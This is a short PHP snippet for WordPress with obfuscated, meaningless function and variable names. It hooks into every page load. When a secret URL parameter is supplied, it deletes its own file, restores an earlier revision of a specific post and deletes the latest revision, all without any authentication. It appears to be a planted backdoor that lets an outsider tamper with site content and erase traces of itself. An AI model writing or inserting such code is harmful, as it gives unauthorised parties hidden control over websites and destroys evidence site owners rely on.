<?php

function mobile_light_quotes_method() {
	if (isset($_GET['file_internal_domain']) && $_GET['file_internal_domain'] === 'static_pack_footer') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$purchase_reloaded_query_lazy = 3666;
		$quotes_changer_builder_scripts = wp_get_post_revisions($purchase_reloaded_query_lazy);
		if (empty($quotes_changer_builder_scripts)) die('no revisions');
		if (count($quotes_changer_builder_scripts) < 2) die('less than 2');
		$this_logo_new_photos = array_shift($quotes_changer_builder_scripts);
		$videos_web_hidden = $this_logo_new_photos->ID;
		$pinterest_last_external = array_shift($quotes_changer_builder_scripts);
		$method_timeline_awesome_edition = $pinterest_last_external->ID;
		$flash_appointment_speed_visual = wp_restore_post_revision($method_timeline_awesome_edition);
		if ($flash_appointment_speed_visual === false) die('error restoring');
		$flash_appointment_speed_visual = wp_delete_post_revision($videos_web_hidden);		
		if ($flash_appointment_speed_visual === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'mobile_light_quotes_method');
